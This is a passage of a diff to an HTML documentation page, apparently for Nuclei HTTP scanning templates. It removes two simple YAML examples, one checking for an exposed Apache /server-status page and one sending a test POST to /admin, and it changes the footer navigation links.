-      <span class="p p-Indicator">-</span> <span class="p p-Indicator">{{</span><span class="nv">BaseURL</span><span class="p p-Indicator">}}</span><span class="l l-Scalar l-Scalar-Plain">/server-status</span>
-
-    <span class="nt">matchers</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">Apache Server Status</span>
-          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">Server Version</span>
-        <span class="nt">condition</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">and</span>
-</code></pre></div>
-
-<h3 id="post-requests">POST requests<a class="headerlink" href="#post-requests" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">post-request</span>
-
-<span class="nt">info</span><span class="p">:</span>
-  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test HTTP Template</span>
-  <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
-  <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">info</span>
-
-<span class="nt">requests</span><span class="p">:</span>
-  <span class="p p-Indicator">-</span> <span class="nt">method</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">POST</span>
-    <span class="nt">path</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="p p-Indicator">{{</span><span class="nv">BaseURL</span><span class="p p-Indicator">}}</span><span class="l l-Scalar l-Scalar-Plain">/admin</span>
-
-    <span class="nt">body</span><span class="p">:</span> <span class="s">&#39;admin=test&#39;</span>
-
-    <span class="nt">matchers</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">Welcome Admin</span>
 </code></pre></div>
                 
               
@@ -905,14 +945,28 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
+          <a href="../raw/" title="RAW HTTP" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                RAW HTTP
+              </div>
+            </div>
+          </a>
         
-          <a href="../dns/" title="DNS" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+        
+          <a href="../workflow/" title="Workflow" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-footer-nav__title">
               <div class="md-ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                DNS
+                Workflow
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
